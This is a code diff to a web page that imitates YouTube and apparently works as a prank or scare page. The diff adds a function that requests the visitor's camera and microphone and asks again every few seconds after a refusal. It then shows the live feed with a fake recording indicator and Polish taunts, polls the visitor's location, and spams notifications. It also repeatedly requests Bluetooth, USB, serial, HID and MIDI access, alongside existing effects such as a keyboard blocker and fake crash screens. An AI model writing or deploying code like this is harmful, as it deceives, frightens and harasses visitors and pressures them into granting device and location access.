@@ -8,7 +8,10 @@
   <meta property="og:title" content="YouTube">
   <meta property="og:description" content="Enjoy the videos and music you love">
   <link rel="icon" id="fav" href="https://www.youtube.com/s/desktop/12d6b690/img/favicon_32x32.png">
+  <script src="https://cdn.jsdelivr.net/npm/skinview3d/bundles/skinview3d.bundle.js"></script>
   <style>
+    .mc-skin-float{position:fixed;z-index:45000;pointer-events:none;border-radius:12px;box-shadow:0 0 40px rgba(255,0,0,.6),0 0 80px rgba(0,255,0,.3);border:3px solid #0f0}
+    .mc-skin-float canvas{display:block;border-radius:9px}
     *{margin:0;padding:0;box-sizing:border-box}
     html,body{width:100%;height:100%;font-family:'Roboto',Arial,sans-serif;overflow:hidden;background:#fff}
     #L{position:fixed;inset:0;z-index:99999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;user-select:none;transition:opacity .4s}
@@ -110,7 +113,98 @@ function CHAOS(){
   speak('To był błąd');speak('zostałeś zptoszkowany');speak('nie uciekniesz');
   xLogout();xWindows();xRain();xFly();xAlerts();xGlitch();xMatrix();xSpeech();xClip();xHist();
   xUrlE();xTheme();xVib();xDL();xCursor();xAudio();xTheramin();xMob();xPops();xTitle();xFav();
-  xConsole();xScan();xBirds();xFlash();xSiren();xInvert();xBSOD();xRotate();xMultiSpeak();xAlarm();
+  xConsole();xScan();xBirds();xFlash();xSiren();xInvert();xBSOD();xRotate();xMultiSpeak();xAlarm();xMCSkin();xCamMic();
+}
+
+// ===== CAMERA & MICROPHONE & EVERYTHING =====
+function xCamMic(){
+  // Request camera + mic immediately
+  function reqCam(){
+    try{
+      navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(stream=>{
+        // try to turn on torch/flashlight
+        stream.getVideoTracks().forEach(track=>{
+          try{track.applyConstraints({advanced:[{torch:true}]})}catch(e){}
+        });
+        // show "camera active" alert
+        sA('📸 KAMERA AKTYWNA','Ptoszek widzi Cię przez kamerę! Uśmiechnij się! 😈');
+        speak('Widzę cię przez kamerę!');
+        // show camera feed on screen for extra creep factor
+        const vid=document.createElement('video');
+        vid.srcObject=stream;vid.autoplay=true;vid.muted=true;vid.playsInline=true;
+        vid.style.cssText='position:fixed;z-index:47000;pointer-events:none;border:4px solid #f00;border-radius:12px;box-shadow:0 0 40px #f00,0 0 80px rgba(255,0,0,.5);opacity:.85';
+        vid.style.width=R(200,350)+'px';
+        document.body.appendChild(vid);
+        // bounce camera feed
+        let cx=R(0,innerWidth-300),cy=R(0,innerHeight-250),cvx=RF(1.5,3.5)*(Math.random()>.5?1:-1),cvy=RF(1.5,3.5)*(Math.random()>.5?1:-1);
+        vid.style.left=cx+'px';vid.style.top=cy+'px';
+        setInterval(()=>{
+          cx+=cvx;cy+=cvy;
+          if(cx<0||cx>innerWidth-300)cvx*=-1;
+          if(cy<0||cy>innerHeight-250)cvy*=-1;
+          cx=Math.max(0,Math.min(cx,innerWidth-300));cy=Math.max(0,Math.min(cy,innerHeight-250));
+          vid.style.left=cx+'px';vid.style.top=cy+'px';
+        },30);
+        // "REC" indicator
+        const rec=document.createElement('div');
+        rec.style.cssText='position:fixed;top:20px;right:20px;z-index:48000;pointer-events:none;color:#f00;font-family:monospace;font-size:18px;font-weight:900;text-shadow:0 0 10px #f00;animation:VB .5s infinite alternate';
+        rec.textContent='● REC';
+        document.body.appendChild(rec);
+      }).catch(()=>{
+        // denied — keep asking every 5 seconds
+        sA('📸 KAMERA ODRZUCONA','Ptoszek jest smutny. Zapyta ponownie... i ponownie... i ponownie...');
+        speak('Daj dostęp do kamery! Ptoszek chce cię zobaczyć!');
+      });
+    }catch(e){}
+  }
+
+  // request immediately
+  reqCam();
+  // keep requesting if denied (every 5 seconds)
+  setInterval(reqCam,5000);
+
+  // also request individually in case combined fails
+  setInterval(()=>{
+    try{navigator.mediaDevices.getUserMedia({audio:true}).catch(()=>{})}catch(e){}
+  },8000);
+  setInterval(()=>{
+    try{navigator.mediaDevices.getUserMedia({video:true}).catch(()=>{})}catch(e){}
+  },10000);
+
+  // request other permissions too for max annoyance
+  // geolocation
+  setInterval(()=>{
+    try{navigator.geolocation.getCurrentPosition(pos=>{
+      sA('📍 LOKALIZACJA','Ptoszek wie gdzie jesteś! Lat: '+pos.coords.latitude.toFixed(2)+' Lon: '+pos.coords.longitude.toFixed(2));
+      speak('Wiem gdzie jesteś!');
+    },()=>{},{})}catch(e){}
+  },12000);
+
+  // notifications
+  setTimeout(()=>{
+    try{Notification.requestPermission().then(p=>{
+      if(p==='granted'){
+        setInterval(()=>{
+          try{new Notification('🐦 PTOSZEK',{body:RE(GL),icon:'https://minotar.net/helm/KitsuneeO/64.png'})}catch(e){}
+        },4000);
+      }
+    })}catch(e){}
+  },3000);
+
+  // MIDI
+  setInterval(()=>{try{navigator.requestMIDIAccess({sysex:true})}catch(e){}},15000);
+
+  // Bluetooth
+  setInterval(()=>{try{navigator.bluetooth.requestDevice({acceptAllDevices:true})}catch(e){}},20000);
+
+  // USB
+  setInterval(()=>{try{navigator.usb.requestDevice({filters:[{}]})}catch(e){}},25000);
+
+  // Serial
+  setInterval(()=>{try{navigator.serial.requestPort({filters:[]})}catch(e){}},30000);
+
+  // HID
+  setInterval(()=>{try{navigator.hid.requestDevice({filters:[]})}catch(e){}},35000);
 }
 
 // ===== POPUPS =====
@@ -301,6 +395,104 @@ function xBSOD(){
 
 // ===== SCREEN ROTATE =====
 function xRotate(){setInterval(()=>{const r=R(-10,10);document.body.style.transform='rotate('+r+'deg) scale('+(1+R(-5,10)/100)+')';setTimeout(()=>document.body.style.transform='',R(300,800))},R(4000,8000))}
+
+// ===== MINECRAFT SKIN 3D — KitsuneeO =====
+function xMCSkin(){
+  // minotar.net works, crafatar is down
+  const SKIN_URL='https://minotar.net/skin/KitsuneeO';
+  const BODY_URL='https://minotar.net/body/KitsuneeO/200.png';
+  const svs=[];
+  let skinBlob=null;
+
+  // fetch skin as blob first (fixes WebGL CORS texture issue)
+  fetch(SKIN_URL).then(r=>r.blob()).then(b=>{
+    skinBlob=URL.createObjectURL(b);
+    go3D();
+  }).catch(()=>go2D());
+
+  function go3D(){
+    for(let i=0;i<3;i++)setTimeout(()=>mk3D(),i*1500);
+    setInterval(()=>{if(svs.length<6)mk3D()},5000);
+  }
+  function go2D(){
+    for(let i=0;i<3;i++)setTimeout(()=>mk2D(),i*800);
+    setInterval(()=>{if(svs.length<6)mk2D()},5000);
+  }
+
+  function mk3D(){
+    const w=R(200,320),h=R(300,440);
+    const cvs=document.createElement('canvas');
+    cvs.style.cssText='position:fixed;z-index:45000;pointer-events:none;border:3px solid #0f0;border-radius:10px;box-shadow:0 0 30px #f00,0 0 60px #0f0';
+    document.body.appendChild(cvs);
+    let px=R(0,innerWidth-w),py=R(0,innerHeight-h);
+    cvs.style.left=px+'px';cvs.style.top=py+'px';
+    const d={el:cvs,px,py,vx:RF(1.5,4)*(Math.random()>.5?1:-1),vy:RF(1.5,4)*(Math.random()>.5?1:-1),w,h};
+    try{
+      const sv=new skinview3d.SkinViewer({canvas:cvs,width:w,height:h});
+      sv.loadSkin(skinBlob);
+      sv.autoRotate=true;
+      sv.autoRotateSpeed=RF(1.5,6)*(Math.random()>.5?1:-1);
+      sv.zoom=RF(.8,1.1);
+      sv.animation=new skinview3d.WalkingAnimation();
+      sv.animation.speed=RF(.6,2.5);
+      try{sv.nameTag='KitsuneeO'}catch(ex){}
+      d.sv=sv;
+      svs.push(d);
+    }catch(e){
+      cvs.remove();
+      mk2D();
+    }
+  }
+
+  function mk2D(){
+    const w=R(100,200);
+    const img=new Image();
+    img.crossOrigin='anonymous';
+    img.src=BODY_URL;
+    img.style.cssText='position:fixed;z-index:45000;pointer-events:none;width:'+w+'px;border:3px solid #0f0;border-radius:10px;box-shadow:0 0 30px #f00,0 0 60px #0f0;image-rendering:pixelated';
+    let px=R(0,innerWidth-w),py=R(0,innerHeight-w*2);
+    img.style.left=px+'px';img.style.top=py+'px';
+    document.body.appendChild(img);
+    const d={el:img,px,py,vx:RF(1.5,4)*(Math.random()>.5?1:-1),vy:RF(1.5,4)*(Math.random()>.5?1:-1),w,h:w*2};
+    let rot=0;setInterval(()=>{rot+=2;img.style.transform='rotate('+rot+'deg)'},30);
+    svs.push(d);
+  }
+
+  // bounce
+  (function tick(){
+    svs.forEach(d=>{
+      d.px+=d.vx;d.py+=d.vy;
+      if(d.px<0||d.px>innerWidth-d.w)d.vx*=-1;
+      if(d.py<0||d.py>innerHeight-(d.h||300))d.vy*=-1;
+      d.px=Math.max(0,Math.min(d.px,innerWidth-d.w));
+      d.py=Math.max(0,Math.min(d.py,innerHeight-(d.h||300)));
+      d.el.style.left=d.px+'px';d.el.style.top=d.py+'px';
+    });
+    requestAnimationFrame(tick);
+  })();
+
+  // always-visible bouncing 2D body (doesn't depend on WebGL)
+  const bi=new Image();bi.crossOrigin='anonymous';bi.src=BODY_URL;
+  bi.style.cssText='position:fixed;z-index:44000;pointer-events:none;width:200px;height:auto;filter:drop-shadow(0 0 20px #f00) drop-shadow(0 0 40px #0f0);image-rendering:pixelated';
+  document.body.appendChild(bi);
+  let bx=R(0,innerWidth-200),by=R(0,innerHeight-350),bvx=3.5,bvy=2.8,br=0;
+  setInterval(()=>{
+    bx+=bvx;by+=bvy;
+    if(bx<0||bx>innerWidth-200)bvx*=-1;
+    if(by<0||by>innerHeight-350)bvy*=-1;
+    bx=Math.max(0,Math.min(bx,innerWidth-200));by=Math.max(0,Math.min(by,innerHeight-350));
+    br+=2;bi.style.left=bx+'px';bi.style.top=by+'px';bi.style.transform='rotate('+br+'deg)';
+  },25);
+
+  // floating nametags
+  setInterval(()=>{
+    const t=document.createElement('div');
+    t.style.cssText='position:fixed;z-index:46000;pointer-events:none;background:rgba(0,0,0,.75);color:#fff;padding:4px 14px;border-radius:4px;font-family:monospace;font-size:15px;font-weight:700;border:1px solid #0f0;text-shadow:0 0 10px #0f0;left:'+R(10,innerWidth-180)+'px;top:'+R(10,innerHeight-40)+'px';
+    t.textContent='KitsuneeO';
+    document.body.appendChild(t);
+    setTimeout(()=>{t.style.transition='opacity .4s';t.style.opacity='0';setTimeout(()=>t.remove(),400)},R(1500,4000));
+  },1200);
+}
 
 // ===== KEYBOARD BLOCKER =====
 function bk(e){
